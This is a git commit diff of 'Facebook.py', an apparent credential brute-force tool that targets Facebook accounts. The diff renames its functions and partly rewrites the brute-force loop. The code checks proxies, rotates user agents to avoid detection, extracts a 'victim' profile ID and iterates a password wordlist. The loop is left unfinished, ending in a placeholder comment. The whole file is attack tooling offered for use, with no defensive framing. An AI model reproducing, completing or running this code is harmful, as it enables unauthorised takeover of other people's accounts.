823f4d5e5de05b9a1b168e45d1183a7bb5504d8f
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-12-31 01:09:48 +0100

    Update Facebook.py

--- Facebook.py
+++ Facebook.py
@@ -15,27 +15,26 @@ gr = "\033[1;32m"
 yl = "\033[1;33m"
 
 # Hosting Secure Connection
-def cnet():
+def check_network():
     try:
         ip = socket.gethostbyname("www.google.com")
         con = socket.create_connection((ip, 80), 2)
         return True
     except socket.error:
-        pass
-    return False
+        return False
 
 # Checking Proxy and Ports
-def cpro(ip, port=None):
+def check_proxy(ip, port=None):
     proxy = '{}:8080'.format(ip) if port is None else '{}:{}'.format(ip, port)
     proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
     try:
         r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
-        return ip == r.headers['X-Client-IP']
+        return ip == r.headers.get('X-Client-IP')
     except Exception:
         return False
 
 # Choice Random User-Agent supporting browser
-def useragent():
+def get_user_agent():
     useragents = [
         'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
@@ -48,22 +47,26 @@ def useragent():
     return random.choice(useragents)
 
 # Fetching Victim Profile ID
-def ID(url):
+def get_profile_id(url):
     try:
-        idre = re.compile('"entity_id":"([0-9]+)"')
-        con = requests.get(url).content
-        idis = idre.findall(con)
-        print(blue + "\n[" + wi + "*" + blue + "] Target Profile" + wi + " ID: " + yl + idis[0] + wi)
+        id_re = re.compile('"entity_id":"([0-9]+)"')
+        content = requests.get(url).content
+        profile_id = id_re.findall(content)
+        print(blue + "\n[" + wi + "*" + blue + "] Target Profile" + wi + " ID: " + yl + profile_id[0] + wi)
     except IndexError:
         print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victim Profile URL " + rd + "!!!" + wi)
         exit(1)
 
 # Brute Force
-def BruteForce(url, wordlist):
+def brute_force(url, wordlist):
     try:
         session = requests.Session()
-        session.headers['User-Agent'] = useragent()
+        session.headers['User-Agent'] = get_user_agent()
 
         for password in wordlist:
             payload = {
-                'email'
+                'email': 'your_email@example.com',
+                'pass': password
+            }
+            # Continue with your logic for the brute force attack
+
